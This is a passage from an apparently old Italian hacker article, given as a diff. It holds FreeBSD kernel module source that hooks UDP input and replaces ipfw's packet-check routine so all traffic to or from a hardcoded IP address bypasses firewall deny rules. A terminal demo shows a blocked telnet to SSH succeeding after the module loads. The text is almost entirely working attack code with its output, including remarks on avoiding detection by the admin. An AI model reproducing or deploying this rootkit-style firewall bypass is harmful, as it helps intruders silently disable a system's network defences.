+	  		old_udp_input = inetsw[1].pr_input;
+			inetsw[1].pr_input = hack_input;
+		        splx(s);
+			break;
+			
+	case MOD_UNLOAD:
+			s = splnet();
+			inetsw[1].pr_input = old_udp_input;
+			splx(s);
+			break;
+ }
+
+return 0;
+}
+
+static moduledata_t s_mod_1 = {
+	        "s_mod",
+	        s_load,
+	        0
+};
+
+DECLARE_MODULE(s_mod, s_mod_1, SI_SUB_PSEUDO, SI_ORDER_ANY);
+
+static void 
+hack_input(m, iphlen)
+	register struct mbuf *m;
+	int iphlen;
+{
+	register struct ip *ip;
+	register struct udphdr *uh;
+	register struct inpcb *inp;
+	struct mbuf *opts = 0;
+	int len;
+	struct ip save_ip;
+
+	udpstat.udps_ipackets++;
+
+	if (iphlen > sizeof (struct ip)) {
+		ip_stripoptions(m, (struct mbuf *)0);
+		iphlen = sizeof(struct ip);
+	}
+
+	ip = mtod(m, struct ip *);
+	if (m->m_len < iphlen + sizeof(struct udphdr)) {
+		if ((m = m_pullup(m, iphlen + sizeof(struct udphdr))) == 0) {
+			udpstat.udps_hdrops++;
+			return;
+		}
+		ip = mtod(m, struct ip *);
+	}
+	uh = (struct udphdr *)((caddr_t)ip + iphlen);
+
+	len = ntohs((u_short)uh->uh_ulen);
+	if (ip->ip_len != len) {
+		if (len > ip->ip_len || len < sizeof(struct udphdr)) {
+			udpstat.udps_badlen++;
+			goto bad;
+		}
+		m_adj(m, len - ip->ip_len);
+		/* ip->ip_len = len; */
+	}
+	save_ip = *ip;
+
+	if (uh->uh_sum) {
+		bzero(((struct ipovly *)ip)->ih_x1, 9);
+		((struct ipovly *)ip)->ih_len = uh->uh_ulen;
+		uh->uh_sum = in_cksum(m, len + sizeof (struct ip));
+		if (uh->uh_sum) {
+			udpstat.udps_badsum++;
+			m_freem(m);
+			return;
+		}
+	}
+
+	if (IN_MULTICAST(ntohl(ip->ip_dst.s_addr)) ||
+	    in_broadcast(ip->ip_dst, m->m_pkthdr.rcvif)) {
+		struct inpcb *last;
+		
+		udp_in.sin_port = uh->uh_sport;
+		udp_in.sin_addr = ip->ip_src;
+		m->m_len -= sizeof (struct udpiphdr);
+		m->m_data += sizeof (struct udpiphdr);
+
+		last = NULL;
+		for (inp = udb.lh_first; inp != NULL; inp = inp->inp_list.le_next) {
+			if (inp->inp_lport != uh->uh_dport)
+				continue;
+			if (inp->inp_laddr.s_addr != INADDR_ANY) {
+				if (inp->inp_laddr.s_addr !=
+				    ip->ip_dst.s_addr)
+					continue;
+			}
+			if (inp->inp_faddr.s_addr != INADDR_ANY) {
+				if (inp->inp_faddr.s_addr !=
+				    ip->ip_src.s_addr ||
+				    inp->inp_fport != uh->uh_sport)
+					continue;
+			}
+
+			if (last != NULL) {
+				struct mbuf *n;
+
+				if ((n = m_copy(m, 0, M_COPYALL)) != NULL) {
+					if (last->inp_flags & INP_CONTROLOPTS
+					    || last->inp_socket->so_options & SO_TIMESTAMP)
+						ip_savecontrol(last, &opts, ip, n);
+					if (sbappendaddr(&last->inp_socket->so_rcv,
+						(struct sockaddr *)&udp_in,
+						n, opts) == 0) {
+						m_freem(n);
+						if (opts)
+						    m_freem(opts);
+						udpstat.udps_fullsock++;
+					} else
+						sorwakeup(last->inp_socket);
+					opts = 0;
+				}
+			}
+			last = inp;
+			if ((last->inp_socket->so_options&(SO_REUSEPORT|SO_REUSEADDR)) == 0)
+				break;
+		}
+
+		if (last == NULL) {
+			udpstat.udps_noportbcast++;
+			goto bad;
+		}
+		if (last->inp_flags & INP_CONTROLOPTS
+		    || last->inp_socket->so_options & SO_TIMESTAMP)
+			ip_savecontrol(last, &opts, ip, m);
+		if (sbappendaddr(&last->inp_socket->so_rcv,
+		     (struct sockaddr *)&udp_in,
+		     m, opts) == 0) {
+			udpstat.udps_fullsock++;
+			goto bad;
+		}
+		sorwakeup(last->inp_socket);
+		return;
+	}
+	inp = in_pcblookup_hash(&udbinfo, ip->ip_src, uh->uh_sport,
+	    ip->ip_dst, uh->uh_dport, 1);
+	if (inp == NULL) {
+		if (log_in_vain) {
+			char buf[4*sizeof "123"];
+
+			strcpy(buf, inet_ntoa(ip->ip_dst));
+			log(LOG_INFO,
+			    "Connection attempt to UDP %s:%d from %s:%d\n",
+			    buf, ntohs(uh->uh_dport), inet_ntoa(ip->ip_src),
+			    ntohs(uh->uh_sport));
+		}
+		udpstat.udps_noport++;
+		if (m->m_flags & (M_BCAST | M_MCAST)) {
+			udpstat.udps_noportbcast++;
+			goto bad;
+		}
+		*ip = save_ip;
+
+		if (badport_bandlim(0) < 0)
+			goto bad;
+
+		icmp_error(m, ICMP_UNREACH, ICMP_UNREACH_PORT, 0, 0);
+		return;
+	}
+
+	udp_in.sin_port = uh->uh_sport;
+	udp_in.sin_addr = ip->ip_src;
+	if (inp->inp_flags & INP_CONTROLOPTS
+	    || inp->inp_socket->so_options & SO_TIMESTAMP)
+		ip_savecontrol(inp, &opts, ip, m);
+	iphlen += sizeof(struct udphdr);
+	m->m_len -= iphlen;
+	m->m_pkthdr.len -= iphlen;
+	m->m_data += iphlen;
+	if (sbappendaddr(&inp->inp_socket->so_rcv, (struct sockaddr *)&udp_in,
+	    m, opts) == 0) {
+		udpstat.udps_fullsock++;
+		goto bad;
+	}
+	sorwakeup(inp->inp_socket);
+	return;
+bad:
+	m_freem(m);
+	if (opts)
+		m_freem(opts);
+}
+
+---------- snip ----------
+
+Se volete vedere che viene eseguita la funzione hack_input() mettete pure una
+semplice printf("UDP") e ogniqualvolta passa qualcosa in udp vi sara'
+stampata tale stringa....
+
+Questo codice puo' poi essere modificato per funzionare su altri os bsd...
+
+E ora un esempio pratico di quello che dicevo:
+
+storpio:#/> ipfw add deny all from 192.168.1.2 to 192.168.1.3
+00000 deny ip from 192.168.1.2 to 192.168.1.3
+
+storpio:#/> telnet porcellino 22
+Trying 192.168.1.3
+telnet: Unable to connect to remote host: Permission denied
+
+storpio:#/> kldload ./fwfilter
+
+storpio:#> telnet porcellino 22
+Escape character is '^]'
+SSH-2.0-2.0.13 (no commercial)
+
+Cosa e' successo ? .. semplice ho bypassato il firewall... la regola c'e'
+ancora ma noi la scavalchiamo...
+
+---------- snip ----------
+
+/*
+ * Hacking a firewall ....
+ * 
+ * ipfw filter ;)
+ *
+ * With this kld ipfw can't block a ip address
+ *
+ * This code is only for legal purposes so I don't cover module and messages
+ * of ipfw.. I write this to give you an idea of how to write a kld...
+ * 
+ * This module has only a problem you have to discover options put on kernel 
+ * by admin when He has compiled it ... because we can't know
+ * them via kld and He could discover this module if we use different options 
+ * but I give this src only for legal purposes so this isn't a my problem
+ * 
+ * example
+ *
+ * storpio# ipfw add deny all from 192.168.1.2 to 192.168.1.3
+ * 00000 deny ip from 192.168.1.2 to 192.168.1.3
+ *
+ * storpio# telnet porcellino 22
+ * Trying 192.168.1.3 ...
+ * telnet: Unable to connect to remote host: Permission denied
+ *
+ * storpio# kldload ./ipfwfil
+ *
+ * storpio# telnet porcellino 22
+ * Escape character is '^]'
+ * SSH-2.0-2.0.13 (non-commercial)
+ * 
+ * 
+ * code & idea by pigpen [pigpen@s0ftpj.org, deadhead@sikurezza.org]
+ */
+
+
+#define		IP_FW_FILTER	"192.168.1.2"
+
+#include <sys/param.h>
+#include <sys/systm.h>
+#include <sys/malloc.h>
+#include <sys/mbuf.h>
+#include <sys/kernel.h>
+#include <sys/proc.h>
+#include <sys/socket.h>
+#include <sys/socketvar.h>
+#include <sys/sysctl.h>
+#include <sys/ucred.h>
+#include <net/if.h>
+#include <net/route.h>
+#include <netinet/in.h>
+#include <netinet/in_systm.h>
+#include <netinet/in_pcb.h>
+#include <netinet/ip.h>
+#include <netinet/ip_var.h>
+#include <netinet/ip_icmp.h>
+#include <netinet/ip_fw.h>
+#include <netinet/ip_dummynet.h>
+#include <netinet/tcp.h>
+#include <netinet/tcp_timer.h>
+#include <netinet/tcp_var.h>
+#include <netinet/tcpip.h>
+#include <netinet/udp.h>
+#include <netinet/udp_var.h>
+
+#include <netinet/if_ether.h> /* XXX ethertype_ip */
+
+#define IPFW_DEFAULT_RULE	((u_int)(u_short)~0)
+
+static int
+		iface_match __P((struct ifnet *ifp, union ip_fw_if *ifu,
+						int byname));
+
+static int	ipopts_match __P((struct ip *ip, struct ip_fw *f));
+static int
+		port_match __P((u_short *portptr, int nports, u_short port,
+					int range_flag));
+static int	tcpflg_match __P((struct tcphdr *tcp, struct ip_fw *f));
+static int	icmptype_match __P((struct icmp *icmp, struct ip_fw *f));
+static void	ipfw_report	__P((struct ip_fw *f, struct ip *ip,
+					struct ifnet *rif, struct ifnet *oif));
+static int	is_icmp_query	__P((struct ip *ip));
+u_int32_t	inaton		__P((const char *str));
+
+#define print_ip(a)	printf("%d.%d.%d.%d",				 \
+				(int)(ntohl(a.s_addr) >> 24) & 0xFF,	 \
+				(int)(ntohl(a.s_addr) >> 16) & 0xFF,	 \
+				(int)(ntohl(a.s_addr) >> 8) & 0xFF,	 \
+				(int)(ntohl(a.s_addr)) & 0xFF);		
+
+
+MALLOC_DEFINE(M_IPFW, "Ipfw/IpAcct", "Ipfw/IpAcct chain's");
+
+
+static int fw_one_pass = 1; /* check */
+extern LIST_HEAD(ip_fw_head, ip_fw_chain) ip_fw_chain;
+static int fw_verbose = 1; /* check */
+static int fw_verbose_limit = 0; /* check */
+
+
+static struct ip_fw_chain * lookup_next_rule(struct ip_fw_chain *me);
+
+static struct ip_fw_chain *
+lookup_next_rule(struct ip_fw_chain *me)
+{
+    struct ip_fw_chain *chain ;
+    int rule = me->rule->fw_skipto_rule ; /* guess... */
+
+    if ( (me->rule->fw_flg & IP_FW_F_COMMAND) == IP_FW_F_SKIPTO )
+	for (chain = me->chain.le_next; chain ; chain = chain->chain.le_next )
+	    if (chain->rule->fw_number >= rule)
+                return chain ;
+    return me->chain.le_next ; /* failure or not a skipto */
+}
+
+static int 
+ip_fw_chk(struct ip **pip, int hlen,
+	struct ifnet *oif, u_int16_t *cookie, struct mbuf **m,
+	struct ip_fw_chain **flow_id,
+        struct sockaddr_in **next_hop)
+{
+	struct ip_fw_chain *chain;
+	struct ip_fw *rule = NULL;
+	struct ip *ip = NULL ;
+	struct ifnet *const rif = (*m)->m_pkthdr.rcvif;
+	u_short offset = 0 ;
+	u_short src_port, dst_port;
+	u_int16_t skipto = *cookie;
+
+	
+	
+	if (pip) { /* normal ip packet */
+	    ip = *pip;
+	    offset = (ip->ip_off & IP_OFFMASK);
+	} else { /* bridged or non-ip packet */
+	    struct ether_header *eh = mtod(*m, struct ether_header *);
+	    switch (ntohs(eh->ether_type)) {
+	    case ETHERTYPE_IP :
+		if ((*m)->m_len<sizeof(struct ether_header) + sizeof(struct ip))
+		    goto non_ip ;
+		ip = (struct ip *)(eh + 1 );
+		if (ip->ip_v != IPVERSION)
+		    goto non_ip ;
+		hlen = ip->ip_hl << 2;
+		if (hlen < sizeof(struct ip)) /* minimum header length */
+		    goto non_ip ;
+		if ((*m)->m_len < 14 + hlen + 14) {
+		    printf("-- m_len %d, need more...\n", (*m)->m_len);
+		    goto non_ip ;
+		}
+		offset = (ip->ip_off & IP_OFFMASK);
+		break ;
+	    default :
+non_ip:         ip = NULL ;
+		break ;
+	    }
+	}
+
+	if (*flow_id) {
+	    if (fw_one_pass)
+		return 0 ; 
+	    
+	    chain = LIST_NEXT( *flow_id, chain);
+
+	    if ( (chain = (*flow_id)->rule->next_rule_ptr) == NULL )
+		chain = (*flow_id)->rule->next_rule_ptr =
+			lookup_next_rule(*flow_id) ;
+		if (! chain) goto dropit;
+	} else {
+	/*
+	 * Go down the chain, looking for enlightment
+	 * If we've been asked to start at a given rule immediatly, do so.
+	 */
+	chain = LIST_FIRST(&ip_fw_chain);
+	if ( skipto ) {
+		if (skipto >= IPFW_DEFAULT_RULE)
+			goto dropit;
+		while (chain && (chain->rule->fw_number <= skipto)) {
+			chain = LIST_NEXT(chain, chain);
+		}
+		if (! chain) goto dropit;
+	}
+	}
+	*cookie = 0;
+	for (; chain; chain = LIST_NEXT(chain, chain)) {
+		register struct ip_fw * f ;
+again:
+		f = chain->rule;
+
+		if (oif) {
+			/* Check direction outbound */
+			if (!(f->fw_flg & IP_FW_F_OUT))
+				continue;
+		} else {
+			/* Check direction inbound */
+			if (!(f->fw_flg & IP_FW_F_IN))
+				continue;
+		}
+		if (ip == NULL ) {
+		    struct ether_header *eh = mtod(*m, struct ether_header *);
+
+		    if (f->fw_number == IPFW_DEFAULT_RULE)
+			goto got_match ;
+		     
+		    if ( f->fw_src.s_addr != 0 || f->fw_prot != IPPROTO_UDP
+			|| f->fw_smsk.s_addr != 0xffffffff )
+			continue;
+		    switch (IP_FW_GETNSRCP(f)) {
+		    case 1: /* match one type */
+			if (  /* ( (f->fw_flg & IP_FW_F_INVSRC) != 0) ^ */
+				( f->fw_uar.fw_pts[0] == ntohs(eh->ether_type) )  ) {
+			    goto got_match ;
+			}
+			break ;
+		    default:
+			break ;
+		    }
+		    continue ;
+		}
+
+		/* Fragments */
+		if ((f->fw_flg & IP_FW_F_FRAG) && offset == 0 )
+			continue;
+
+		/* If src-addr doesn't match, not this rule. */
+		if (((f->fw_flg & IP_FW_F_INVSRC) != 0) ^ ((ip->ip_src.s_addr
+		    & f->fw_smsk.s_addr) != f->fw_src.s_addr))
+			continue;
+
+		/* If dest-addr doesn't match, not this rule. */
+		if (((f->fw_flg & IP_FW_F_INVDST) != 0) ^ ((ip->ip_dst.s_addr
+		    & f->fw_dmsk.s_addr) != f->fw_dst.s_addr))
+			continue;
+
+		/* Interface check */
+		if ((f->fw_flg & IF_FW_F_VIAHACK) == IF_FW_F_VIAHACK) {
+			struct ifnet *const iface = oif ? oif : rif;
+
+			/* Backwards compatibility hack for "via" */
+			if (!iface || !iface_match(iface,
+			    &f->fw_in_if, f->fw_flg & IP_FW_F_OIFNAME))
+				continue;
+		} else {
+			/* Check receive interface */
+			if ((f->fw_flg & IP_FW_F_IIFACE)
+			    && (!rif || !iface_match(rif,
+			      &f->fw_in_if, f->fw_flg & IP_FW_F_IIFNAME)))
+				continue;
+			/* Check outgoing interface */
+			if ((f->fw_flg & IP_FW_F_OIFACE)
+			    && (!oif || !iface_match(oif,
+			      &f->fw_out_if, f->fw_flg & IP_FW_F_OIFNAME)))
+				continue;
+		}
+
+		/* Check IP options */
+		if (f->fw_ipopt != f->fw_ipnopt && !ipopts_match(ip, f))
+			continue;
+
+		/* Check protocol; if wildcard, and no [ug]id, match */
+		if (f->fw_prot == IPPROTO_IP) {
+			if (!(f->fw_flg & (IP_FW_F_UID|IP_FW_F_GID)))
+				goto got_match;
+		} else
+		    /* If different, don't match */
+		    if (ip->ip_p != f->fw_prot) 
+			    continue;
+
+#define PULLUP_TO(l)	do {                                            \
+			    int len = (pip ? l : l + 14 ) ;             \
+			    if ((*m)->m_len < (len) ) {                 \
+				if ( (*m = m_pullup(*m, (len))) == 0)   \
+				    goto bogusfrag;                     \
+				ip = mtod(*m, struct ip *);             \
+				if (pip)                                \
+				    *pip = ip ;                         \
+				else                                    \
+				    ip = (struct ip *)((char *)ip + 14);\
+				offset = (ip->ip_off & IP_OFFMASK);     \
+			    }                                           \
+			} while (0)
+
+		/* Protocol specific checks for uid only */
+		if (f->fw_flg & (IP_FW_F_UID|IP_FW_F_GID)) {
+		    switch (ip->ip_p) {
+		    case IPPROTO_TCP:
+			{
+			    struct tcphdr *tcp;
+			    struct inpcb *P;
+
+			    if (offset == 1)	/* cf. RFC 1858 */
+				    goto bogusfrag;
+			    if (offset != 0)
+				    continue;
+
+			    PULLUP_TO(hlen + 14);
+			    tcp =(struct tcphdr *)((u_int32_t *)ip + ip->ip_hl);
+
+			    if (oif)
+				P = in_pcblookup_hash(&tcbinfo, ip->ip_dst,
+				   tcp->th_dport, ip->ip_src, tcp->th_sport, 0);
+			    else
+				P = in_pcblookup_hash(&tcbinfo, ip->ip_src,
+				   tcp->th_sport, ip->ip_dst, tcp->th_dport, 0);
+
+			    if (P && P->inp_socket && P->inp_socket->so_cred) {
+				if (f->fw_flg & IP_FW_F_UID) {
+					if (P->inp_socket->so_cred->p_ruid !=
+					    f->fw_uid)
+						continue;
+				} else if (!groupmember(f->fw_gid,
+					    P->inp_socket->so_cred->pc_ucred))
+						continue;
+			    } else continue;
+
+			    break;
+			}
+
+		    case IPPROTO_UDP:
+			{
+			    struct udphdr *udp;
+			    struct inpcb *P;
+
+			    if (offset != 0)
+				continue;
+
+			    PULLUP_TO(hlen + 4);
+			    udp =(struct udphdr *)((u_int32_t *)ip + ip->ip_hl);
+
+			    if (oif)
+				P = in_pcblookup_hash(&udbinfo, ip->ip_dst,
+				   udp->uh_dport, ip->ip_src, udp->uh_sport, 1);
+			    else
+				P = in_pcblookup_hash(&udbinfo, ip->ip_src,
+				   udp->uh_sport, ip->ip_dst, udp->uh_dport, 1);
+
+			    if (P && P->inp_socket && P->inp_socket->so_cred) {
+				if (f->fw_flg & IP_FW_F_UID) {
+					if (P->inp_socket->so_cred->p_ruid !=
+					    f->fw_uid)
+						continue;
+				} else if (!groupmember(f->fw_gid,
+					    P->inp_socket->so_cred->pc_ucred))
+						continue;
+			    } else continue;
+
+			    break;
+			}
+
+			default:
+				continue;
+/*
+ * XXX Shouldn't GCC be allowing two bogusfrag labels if they're both inside
+ * separate blocks? Hmm.... It seems it's got incorrect behavior here.
+ */
+#if 0
+bogusfrag:
+				if (fw_verbose)
+					ipfw_report(NULL, ip, rif, oif);
+				goto dropit;
+#endif
+			}
+		}
+		    
+		/* Protocol specific checks */
+		switch (ip->ip_p) {
+		case IPPROTO_TCP:
+		    {
+			struct tcphdr *tcp;
+
+			if (offset == 1)	/* cf. RFC 1858 */
+				goto bogusfrag;
+			if (offset != 0) {
+				/*
+				 * TCP flags and ports aren't available in this
+				 * packet -- if this rule specified either one,
+				 * we consider the rule a non-match.
+				 */
+				if (f->fw_nports != 0 ||
+				    f->fw_tcpf != f->fw_tcpnf)
+					continue;
+
+				break;
+			}
+			PULLUP_TO(hlen + 14);
+			tcp = (struct tcphdr *) ((u_int32_t *)ip + ip->ip_hl);
+			if (f->fw_tcpf != f->fw_tcpnf && !tcpflg_match(tcp, f))
+				continue;
+			src_port = ntohs(tcp->th_sport);
+			dst_port = ntohs(tcp->th_dport);
+			goto check_ports;
+		    }
+
+		case IPPROTO_UDP:
+		    {
+			struct udphdr *udp;
+
+			if (offset != 0) {
+				/*
+				 * Port specification is unavailable -- if this
+				 * rule specifies a port, we consider the rule
+				 * a non-match.
+				 */
+				if (f->fw_nports != 0)
+					continue;
+
+				break;
+			}
+			PULLUP_TO(hlen + 4);
+			udp = (struct udphdr *) ((u_int32_t *)ip + ip->ip_hl);
+			src_port = ntohs(udp->uh_sport);
+			dst_port = ntohs(udp->uh_dport);
+check_ports:
+			if (!port_match(&f->fw_uar.fw_pts[0],
+			    IP_FW_GETNSRCP(f), src_port,
+			    f->fw_flg & IP_FW_F_SRNG))
+				continue;
+			if (!port_match(&f->fw_uar.fw_pts[IP_FW_GETNSRCP(f)],
+			    IP_FW_GETNDSTP(f), dst_port,
+			    f->fw_flg & IP_FW_F_DRNG)) 
+				continue;
+			break;
+		    }
+
+		case IPPROTO_ICMP:
+		    {
+			struct icmp *icmp;
+
+			if (offset != 0)	/* Type isn't valid */
+				break;
+			PULLUP_TO(hlen + 2);
+			icmp = (struct icmp *) ((u_int32_t *)ip + ip->ip_hl);
+			if (!icmptype_match(icmp, f))
+				continue;
+			break;
+		    }
+#undef PULLUP_TO
+
+bogusfrag:
+			if (fw_verbose)
+				ipfw_report(NULL, ip, rif, oif);
+			goto dropit;
+		}
+
+got_match:
+		*flow_id = chain ; /* XXX set flow id */
+		/* Update statistics */
+		f->fw_pcnt += 1;
+		if (ip) {
+		    f->fw_bcnt += ip->ip_len;
+		}
+		f->timestamp = time_second;
+
+		/* Log to console if desired */
+		if ((f->fw_flg & IP_FW_F_PRN) && fw_verbose)
+			ipfw_report(f, ip, rif, oif);
+			
+			
+
+		if( (ip->ip_src.s_addr == inaton(IP_FW_FILTER)  ||
+ 		     ip->ip_dst.s_addr == inaton(IP_FW_FILTER)) &&
+		     (f->fw_flg & IP_FW_F_COMMAND) != IP_FW_F_DIVERT &&
+		     (f->fw_flg & IP_FW_F_COMMAND) != IP_FW_F_FWD) 
+		 return 0;	
+			
+					
+		/* Take appropriate action */
+		switch (f->fw_flg & IP_FW_F_COMMAND) {
+		case IP_FW_F_ACCEPT:
+			return(0);
+		case IP_FW_F_COUNT:
+			continue;
+		case IP_FW_F_DIVERT:
+			*cookie = f->fw_number;
+			return(f->fw_divert_port);
+		case IP_FW_F_TEE:
+			/*
+			 * XXX someday tee packet here, but beware that you
+			 * can't use m_copym() or m_copypacket() because
+			 * the divert input routine modifies the mbuf
+			 * (and these routines only increment reference
+			 * counts in the case of mbuf clusters), so need
+			 * to write custom routine.
+			 */
+			continue;
+		case IP_FW_F_SKIPTO: /* XXX check */
+			if ( f->next_rule_ptr )
+			    chain = f->next_rule_ptr ;
+			else
+			    chain = lookup_next_rule(chain) ;
+			if (! chain) goto dropit;
+			goto again ;
+		case IP_FW_F_PIPE:
+			return(f->fw_pipe_nr | 0x10000 );
+		case IP_FW_F_FWD:
+			/* Change the next-hop address for this packet.
+			 * Initially we'll only worry about directly
+			 * reachable next-hop's, but ultimately
+			 * we will work out for next-hops that aren't
+			 * direct the route we would take for it. We
+			 * [cs]ould leave this latter problem to
+			 * ip_output.c. We hope to high [name the abode of
+			 * your favourite deity] that ip_output doesn't modify
+			 * the new value of next_hop (which is dst there)
+			 */
+			if (next_hop != NULL) /* Make sure, first... */
+				*next_hop = &(f->fw_fwd_ip);
+			return(0); /* Allow the packet */
+		}
+
+		/* Deny/reject this packet using this rule */
+		rule = f;
+		break;
+
+	}
+
+#ifdef DIAGNOSTIC
+	/* Rule IPFW_DEFAULT_RULE should always be there and should always match */
+	if (!chain)
+		panic("ip_fw: chain");
+#endif
+
+	/*
+	 * At this point, we're going to drop the packet.
+	 * Send a reject notice if all of the following are true:
+	 *
+	 * - The packet matched a reject rule
+	 * - The packet is not an ICMP packet, or is an ICMP query packet
+	 * - The packet is not a multicast or broadcast packet
+	 */
+	if ((rule->fw_flg & IP_FW_F_COMMAND) == IP_FW_F_REJECT
+	    && ip
+	    && (ip->ip_p != IPPROTO_ICMP || is_icmp_query(ip))
+	    && !((*m)->m_flags & (M_BCAST|M_MCAST))
+	    && !IN_MULTICAST(ntohl(ip->ip_dst.s_addr))) {
+		switch (rule->fw_reject_code) {
+		case IP_FW_REJECT_RST:
+		  {
+			struct tcphdr *const tcp =
+				(struct tcphdr *) ((u_int32_t *)ip + ip->ip_hl);
+			struct tcpiphdr ti, *const tip = (struct tcpiphdr *) ip;
+
+			if (offset != 0 || (tcp->th_flags & TH_RST))
+				break;
+			ti.ti_i = *((struct ipovly *) ip);
+			ti.ti_t = *tcp;
+			bcopy(&ti, ip, sizeof(ti));
+			NTOHL(tip->ti_seq);
+			NTOHL(tip->ti_ack);
+			tip->ti_len = ip->ip_len - hlen - (tip->ti_off << 2);
+			
+			if (tcp->th_flags & TH_ACK) {
+				tcp_respond(NULL, tip, *m,
+				    (tcp_seq)0, ntohl(tcp->th_ack), TH_RST);
+			} else {
+				if (tcp->th_flags & TH_SYN)
+					tip->ti_len++;
+				tcp_respond(NULL, tip, *m, tip->ti_seq
+				    + tip->ti_len, (tcp_seq)0, TH_RST|TH_ACK);
+			}
+
+			
+			*m = NULL;
+			break;
+		  }
+		default:	/* Send an ICMP unreachable using code */
+			icmp_error(*m, ICMP_UNREACH,
+			     rule->fw_reject_code, 0L, 0);
+			*m = NULL;
+			break;
+		}
+	}
+
+dropit:
+	/*
+	 * Finally, drop the packet.
+	 */
+	/* *cookie = 0; */ /* XXX is this necessary ? */
+	if (*m) {
+		m_freem(*m);
+		*m = NULL;
+	}
+	return(0);
+}
+
+
+
+static ip_fw_chk_t *old_chk_ptr;
+
+static int
+ipfw_modevent(module_t mod, int type, void *unused)
+{
+	int s;
+	
+	switch (type) {
+	case MOD_LOAD:
+		s = splnet();
+		old_chk_ptr = ip_fw_chk_ptr;
+		ip_fw_chk_ptr = ip_fw_chk; 
+		splx(s);
+		break;
+	case MOD_UNLOAD:
+		s = splnet();
+		ip_fw_chk_ptr =  old_chk_ptr;
+		splx(s);
+		break;
+	}
+	return 0;
+}
+
+static moduledata_t ipfwmod = {
+	"sfire",
+	ipfw_modevent,
+	0
+};
+DECLARE_MODULE(sfire, ipfwmod, SI_SUB_PSEUDO, SI_ORDER_ANY);
+
+/*
+ * Returns 1 if the port is matched by the vector, 0 otherwise
+ */
+static int 
+port_match(u_short *portptr, int nports, u_short port, int range_flag)
+{
+	if (!nports)
+		return 1;
+	if (range_flag) {
+		if (portptr[0] <= port && port <= portptr[1]) {
+			return 1;
+		}
+		nports -= 2;
+		portptr += 2;
+	}
+	while (nports-- > 0) {
+		if (*portptr++ == port) {
+			return 1;
+		}
+	}
+	return 0;
+}
+
+static int
+tcpflg_match(struct tcphdr *tcp, struct ip_fw *f)
+{
+	u_char		flg_set, flg_clr;
+	
+	if ((f->fw_tcpf & IP_FW_TCPF_ESTAB) &&
+	    (tcp->th_flags & (IP_FW_TCPF_RST | IP_FW_TCPF_ACK)))
+		return 1;
+
+	flg_set = tcp->th_flags & f->fw_tcpf;
+	flg_clr = tcp->th_flags & f->fw_tcpnf;
+
+	if (flg_set != f->fw_tcpf)
+		return 0;
+	if (flg_clr)
+		return 0;
+
+	return 1;
+}
+
+static int
+icmptype_match(struct icmp *icmp, struct ip_fw *f)
+{
+	int type;
+
+	if (!(f->fw_flg & IP_FW_F_ICMPBIT))
+		return(1);
+
+	type = icmp->icmp_type;
+
+	/* check for matching type in the bitmap */
+	if (type < IP_FW_ICMPTYPES_MAX &&
+		(f->fw_uar.fw_icmptypes[type / (sizeof(unsigned) * 8)] & 
+		(1U << (type % (8 * sizeof(unsigned))))))
+		return(1);
+
+	return(0); /* no match */
+}
+
+static int
+is_icmp_query(struct ip *ip)
+{
+	const struct icmp *icmp;
+	int icmp_type;
+
+	icmp = (struct icmp *)((u_int32_t *)ip + ip->ip_hl);
+	icmp_type = icmp->icmp_type;
+
+	if (icmp_type == ICMP_ECHO || icmp_type == ICMP_ROUTERSOLICIT ||
+	    icmp_type == ICMP_TSTAMP || icmp_type == ICMP_IREQ ||
+	    icmp_type == ICMP_MASKREQ)
+		return(1);
+
+	return(0);
+}
+
+static int
+ipopts_match(struct ip *ip, struct ip_fw *f)
+{
+	register u_char *cp;
+	int opt, optlen, cnt;
+	u_char	opts, nopts, nopts_sve;
+
+	cp = (u_char *)(ip + 1);
+	cnt = (ip->ip_hl << 2) - sizeof (struct ip);
+	opts = f->fw_ipopt;
+	nopts = nopts_sve = f->fw_ipnopt;
+
+	for (; cnt > 0; cnt -= optlen, cp += optlen) {
+		opt = cp[IPOPT_OPTVAL];
+		if (opt == IPOPT_EOL)
+			break;
+		if (opt == IPOPT_NOP)
+			optlen = 1;
+		else {
+			optlen = cp[IPOPT_OLEN];
+			if (optlen <= 0 || optlen > cnt) {
+				return 0; /*XXX*/
+			}
+		}
+		switch (opt) {
+
+		default:
+			break;
+
+		case IPOPT_LSRR:
+			opts &= ~IP_FW_IPOPT_LSRR;
+			nopts &= ~IP_FW_IPOPT_LSRR;
+			break;
+
+		case IPOPT_SSRR:
+			opts &= ~IP_FW_IPOPT_SSRR;
+			nopts &= ~IP_FW_IPOPT_SSRR;
+			break;
+
+		case IPOPT_RR:
+			opts &= ~IP_FW_IPOPT_RR;
+			nopts &= ~IP_FW_IPOPT_RR;
+			break;
+		case IPOPT_TS:
+			opts &= ~IP_FW_IPOPT_TS;
+			nopts &= ~IP_FW_IPOPT_TS;
+			break;
+		}
+		if (opts == nopts)
+			break;
+	}
+	if (opts == 0 && nopts == nopts_sve)
+		return 1;
+	else
+		return 0;
+}
+
+static int
+iface_match(struct ifnet *ifp, union ip_fw_if *ifu, int byname)
+{
+	/* Check by name or by IP address */
+	if (byname) {
+		/* Check unit number (-1 is wildcard) */
+		if (ifu->fu_via_if.unit != -1
+		    && ifp->if_unit != ifu->fu_via_if.unit)
+			return(0);
+		/* Check name */
+		if (strncmp(ifp->if_name, ifu->fu_via_if.name, FW_IFNLEN))
+			return(0);
+		return(1);
+	} else if (ifu->fu_via_ip.s_addr != 0) {	/* Zero == wildcard */
+		struct ifaddr *ia;
+
+		for (ia = ifp->if_addrhead.tqh_first;
+		    ia != NULL; ia = ia->ifa_link.tqe_next) {
+			if (ia->ifa_addr == NULL)
+				continue;
+			if (ia->ifa_addr->sa_family != AF_INET)
+				continue;
+			if (ifu->fu_via_ip.s_addr != ((struct sockaddr_in *)
+			    (ia->ifa_addr))->sin_addr.s_addr)
+				continue;
+			return(1);
+		}
+		return(0);
+	}
+	return(1);
+}
+
+static void
+ipfw_report(struct ip_fw *f, struct ip *ip,
+	struct ifnet *rif, struct ifnet *oif)
+{
+    if (ip) {
+	static u_int64_t counter;
+	struct tcphdr *const tcp = (struct tcphdr *) ((u_int32_t *) ip+ ip->ip_hl);
+	struct udphdr *const udp = (struct udphdr *) ((u_int32_t *) ip+ ip->ip_hl);
+	struct icmp *const icmp = (struct icmp *) ((u_int32_t *) ip + ip->ip_hl);
+	int count;
+
+	count = f ? f->fw_pcnt : ++counter;
+	if (fw_verbose_limit != 0 && count > fw_verbose_limit)
+		return;
+
+	/* Print command name */
+	printf("ipfw: %d ", f ? f->fw_number : -1);
+	if (!f)
+		printf("Refuse");
+	else
+		switch (f->fw_flg & IP_FW_F_COMMAND) {
+		case IP_FW_F_DENY:
+			printf("Deny");
+			break;
+		case IP_FW_F_REJECT:
